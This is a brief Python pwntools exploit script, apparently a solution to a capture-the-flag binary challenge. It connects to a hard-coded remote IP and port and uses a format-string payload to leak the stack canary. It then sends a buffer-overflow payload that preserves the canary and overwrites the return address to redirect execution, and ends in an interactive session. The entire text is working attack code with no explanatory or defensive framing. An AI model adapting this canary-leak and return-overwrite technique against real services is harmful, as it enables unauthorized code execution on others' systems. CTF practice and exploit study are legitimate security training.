from pwn import * 

context(os='linux', arch='amd64', log_level='debug')

r = remote('111.200.241.244',61170)
#r = remote('127.0.0.1',10001)

ret_addr = 0x4008DA
payload =  b"%23$lx"
r.sendlineafter("Exit the battle",  b"2")
r.recv()
r.sendline(payload)
canary_raw = r.recv(16)
canary = int(canary_raw,16)
p_canary = p64(canary)
payload2 = b"A"*0x88 + p_canary + b"_old_rbp" + p64(ret_addr)
r.sendlineafter("battle",  b"1")
r.recv()
r.send(payload2)
r.interactive()
